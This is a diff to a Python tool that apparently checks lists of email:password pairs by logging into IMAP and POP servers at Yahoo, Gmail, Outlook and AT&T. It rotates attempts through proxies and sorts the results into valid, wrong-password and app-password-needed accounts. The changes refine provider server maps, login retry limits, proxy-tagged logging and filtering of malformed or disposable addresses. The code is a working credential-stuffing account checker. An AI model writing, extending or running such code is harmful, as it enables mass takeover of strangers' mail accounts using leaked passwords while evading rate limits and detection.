@@ -1165,25 +1165,72 @@ def generate_candidate_hosts(domain: str, mx_records: list = None) -> list:
 
     return list(dict.fromkeys(candidates))
 
+def px_tag(proxy_str):
+    if not proxy_str:
+        return "direct"
+    info = parse_proxy(proxy_str) if "parse_proxy" in globals() else None
+    if info:
+        return f"{info.get('host')}:{info.get('port')}"
+    return "proxy"
+
+def known_provider_conf(domain):
+    yahoo_imap = ["imap.mail.yahoo.com"]
+    yahoo_pop = ["pop.mail.yahoo.com"]
+    ms_imap = ["outlook.office365.com", "imap-mail.outlook.com"]
+    ms_pop = ["outlook.office365.com"]
+    gmail_imap = ["imap.gmail.com"]
+    gmail_pop = ["pop.gmail.com"]
+    att_imap = ["imap.mail.att.net"]
+    att_pop = ["inbound.att.net"]
+    yahoo_domains = {
+        "yahoo.com", "ymail.com", "rocketmail.com", "frontier.com", "frontiernet.net",
+        "sbcglobal.net", "att.net", "bellsouth.net", "pacbell.net", "swbell.net",
+        "ameritech.net", "currently.com", "prodigy.net", "snet.net",
+    }
+    ms_domains = {"outlook.com", "hotmail.com", "live.com", "msn.com", "outlook.com.br", "hotmail.com.br"}
+    if domain in yahoo_domains or domain.endswith(".yahoo.com"):
+        return {"imap": yahoo_imap, "pop": yahoo_pop, "pop3": yahoo_pop}
+    if domain in ms_domains or domain.endswith(".outlook.com") or domain.endswith(".hotmail.com"):
+        return {"imap": ms_imap, "pop": ms_pop, "pop3": ms_pop}
+    if domain in {"gmail.com", "googlemail.com"}:
+        return {"imap": gmail_imap, "pop": gmail_pop, "pop3": gmail_pop}
+    if domain == "att.net":
+        return {"imap": att_imap, "pop": att_pop, "pop3": att_pop}
+    return None
+
+def drop_before_check(email):
+    email = (email or "").strip().lower()
+    if email.count("@") != 1:
+        return "bad format"
+    local, domain = email.split("@", 1)
+    if "http" in local or "login.live" in local or not local or "." not in domain:
+        return "bad format"
+    junk = ("tempmail", "guerrillamail", "mailinator", "yopmail", "trashmail", "rerttymail", "10minutemail", "throwaway")
+    if any(part in domain for part in junk):
+        return "disposable"
+    return ""
+
 def get_servers(email):
     try:
         domain = email.split("@")[-1].lower().strip()
         if domain in ZERO_ACCESS_PROVIDERS:
             return {"imap": [], "pop": [], "pop3": [], "type": "zero_access"}
-        
-        with cache_lock:
-            if domain in domain_cache and "imap" in domain_cache[domain]:
-                return domain_cache[domain]
-                
+
+        known = known_provider_conf(domain)
+        if known:
+            return known
+
+        parent_domain = detect_parent_provider(domain)
+        if parent_domain in ("yahoo.com", "gmail.com"):
+            return known_provider_conf(parent_domain)
+        if parent_domain == "outlook.office365.com":
+            return known_provider_conf("outlook.com")
+
         if domain in PROVIDER_MAP:
             return PROVIDER_MAP[domain]
 
-        # FIX: Check if there is an explicit parent provider mapping first
-        parent_domain = detect_parent_provider(domain)
-        effective_domain = parent_domain if parent_domain else domain
-
-        mx_records = get_mx_hosts(effective_domain)
-        candidate_hosts = generate_candidate_hosts(effective_domain, mx_records)
+        mx_records = get_mx_hosts(domain)
+        candidate_hosts = [h for h in generate_candidate_hosts(domain, mx_records) if not h.startswith(("smtp.", "secure.", "pop3."))][:3]
 
         servers = {
             "imap": candidate_hosts,
@@ -1570,58 +1617,58 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
         if proxy_mode == "fallback" and px:
             proxies_to_try.append(None)
 
-        max_attempts = 1 if CFG.get("FAST_MODE", True) else min(len(conf.get("imap", [])), 6)
+        max_attempts = min(len(conf.get("imap", [])), 2)
 
         for current_px in proxies_to_try:
             if current_px and not precheck_proxy_fast(current_px):
                 continue
 
             for server in conf.get("imap", [])[:max_attempts]:
-                trace_logs.append(f"[direct-sslsoft] Attempting IMAP -> Host: {server}:993")
+                trace_logs.append(f"{px_tag(current_px)} Attempting IMAP -> Host: {server}:993")
                 try:
                     imap_once(email, password, server, current_px, insecure=prefer_insecure)
                     record_proxy_attempt(current_px, success=True)
-                    return server, "valid", f"[direct-sslsoft] IMAP | Host: {server} | Port: 993", current_px, trace_logs
+                    return server, "valid", f"{px_tag(current_px)} IMAP | Host: {server} | Port: 993", current_px, trace_logs
                 except (socket.timeout, socket.error, ConnectionRefusedError, ssl.SSLError) as sock_err:
                     st_val = classify_error(sock_err, domain)
                     record_proxy_attempt(current_px, success=False, is_network_error=True)
-                    trace_logs.append(f"[direct-sslsoft] -> SOCKET FAILED IMAP on {server}: {str(sock_err)[:50]} [Classified: {st_val}]")
+                    trace_logs.append(f"{px_tag(current_px)} -> SOCKET FAILED IMAP on {server}: {str(sock_err)[:50]} [Classified: {st_val}]")
                     if st_val in ("wrong_password", "need_app_password"):
-                        return None, st_val, f"[direct-sslsoft] IMAP {server} -> {st_val}", current_px, trace_logs
+                        return None, st_val, f"{px_tag(current_px)} IMAP {server} -> {st_val}", current_px, trace_logs
                     continue
                 except Exception as e:
                     st_val = classify_error(e, domain)
                     is_net = (st_val == "connection_failed")
                     record_proxy_attempt(current_px, success=False, is_network_error=is_net)
-                    trace_logs.append(f"[direct-sslsoft] -> FAILED IMAP on {server}: {str(e)[:50]} [Classified: {st_val}]")
+                    trace_logs.append(f"{px_tag(current_px)} -> FAILED IMAP on {server}: {str(e)[:50]} [Classified: {st_val}]")
                     if st_val in ("wrong_password", "need_app_password"):
-                        return None, st_val, f"[direct-sslsoft] IMAP {server} -> {st_val}", current_px, trace_logs
+                        return None, st_val, f"{px_tag(current_px)} IMAP {server} -> {st_val}", current_px, trace_logs
                     continue
 
             for server in conf.get("pop", [])[:max_attempts]:
-                trace_logs.append(f"[direct-sslsoft] Attempting POP -> Host: {server}:995")
+                trace_logs.append(f"{px_tag(current_px)} Attempting POP -> Host: {server}:995")
                 try:
                     pop_once(email, password, server, current_px, insecure=prefer_insecure)
                     record_proxy_attempt(current_px, success=True)
-                    return server, "valid", f"[direct-sslsoft] POP | Host: {server} | Port: 995", current_px, trace_logs
+                    return server, "valid", f"{px_tag(current_px)} POP | Host: {server} | Port: 995", current_px, trace_logs
                 except (socket.timeout, socket.error, ConnectionRefusedError, ssl.SSLError) as sock_err:
                     st_val = classify_error(sock_err, domain)
                     record_proxy_attempt(current_px, success=False, is_network_error=True)
-                    trace_logs.append(f"[direct-sslsoft] -> SOCKET FAILED POP on {server}: {str(sock_err)[:50]} [Classified: {st_val}]")
+                    trace_logs.append(f"{px_tag(current_px)} -> SOCKET FAILED POP on {server}: {str(sock_err)[:50]} [Classified: {st_val}]")
                     if st_val in ("wrong_password", "need_app_password"):
-                        return None, st_val, f"[direct-sslsoft] POP {server} -> {st_val}", current_px, trace_logs
+                        return None, st_val, f"{px_tag(current_px)} POP {server} -> {st_val}", current_px, trace_logs
                     continue
                 except Exception as e:
                     st_val = classify_error(e, domain)
                     is_net = (st_val == "connection_failed")
                     record_proxy_attempt(current_px, success=False, is_network_error=is_net)
-                    trace_logs.append(f"[direct-sslsoft] -> FAILED POP on {server}: {str(e)[:50]} [Classified: {st_val}]")
+                    trace_logs.append(f"{px_tag(current_px)} -> FAILED POP on {server}: {str(e)[:50]} [Classified: {st_val}]")
                     if st_val in ("wrong_password", "need_app_password"):
-                        return None, st_val, f"[direct-sslsoft] POP {server} -> {st_val}", current_px, trace_logs
+                        return None, st_val, f"{px_tag(current_px)} POP {server} -> {st_val}", current_px, trace_logs
                     continue
 
     except Exception as e:
-        trace_logs.append(f"[direct-sslsoft] Critical Exception in runner: {str(e)}")
+        trace_logs.append(f"{px_tag(current_px)} Critical Exception in runner: {str(e)}")
         if CFG.get("FAST_MODE", True):
             failed_domain_cache[domain] = time.time()
         return None, "connection_failed", str(e)[:40], None, trace_logs
@@ -1717,6 +1764,9 @@ if start_engine_btn:
                     return {"line": f"{line} | Error: Invalid format", "status": "connection_failed", "trace": ["Invalid format"]}
                 email, password = line.split(":", 1)
                 email, password = email.strip(), password.strip()
+                reason = drop_before_check(email)
+                if reason:
+                    return {"line": f"{email}:{password} | {reason}", "email": email, "password": password, "status": "skipped", "detail": reason, "trace": [reason]}
                 domain = email.split("@")[-1].lower()
                 conf = get_servers(email)
                 
